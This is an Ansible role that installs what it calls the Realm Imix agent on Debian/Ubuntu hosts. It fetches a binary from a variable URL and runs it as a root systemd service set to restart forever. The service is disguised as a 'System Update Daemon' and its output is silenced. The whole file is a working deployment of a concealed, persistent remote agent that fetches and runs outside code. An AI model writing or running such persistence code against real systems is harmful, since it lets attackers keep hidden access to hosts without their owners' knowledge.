---
# roles/realm-linux/tasks/main.yml
# Deploys and persists the Realm Imix agent on Debian/Ubuntu

- name: Install prerequisites
  ansible.builtin.package:
    name:
      - curl
      - wget
    state: present

- name: Download Realm agent binary
  ansible.builtin.get_url:
    url: "{{ agent_src_url }}"
    dest: "{{ agent_dest_path }}"
    mode: '0755'
    force: true               # Re-download if already exists (for updates)

- name: Create systemd service for agent persistence
  ansible.builtin.copy:
    dest: "/etc/systemd/system/{{ agent_service_name }}.service"
    content: |
      [Unit]
      Description=System Update Daemon
      After=network.target
      StartLimitIntervalSec=0

      [Service]
      Type=simple
      ExecStart={{ agent_dest_path }}
      Restart=always
      RestartSec=10
      StandardOutput=null
      StandardError=null

      [Install]
      WantedBy=multi-user.target
    owner: root
    group: root
    mode: '0644'

- name: Reload systemd daemon
  ansible.builtin.systemd:
    daemon_reload: true

- name: Enable and start agent service
  ansible.builtin.systemd:
    name: "{{ agent_service_name }}"
    enabled: true
    state: started

- name: Verify agent service is running
  ansible.builtin.systemd:
    name: "{{ agent_service_name }}"
  register: service_status

- name: Print service status
  ansible.builtin.debug:
    msg: "Agent on {{ inventory_hostname }} is {{ service_status.status.ActiveState }}"
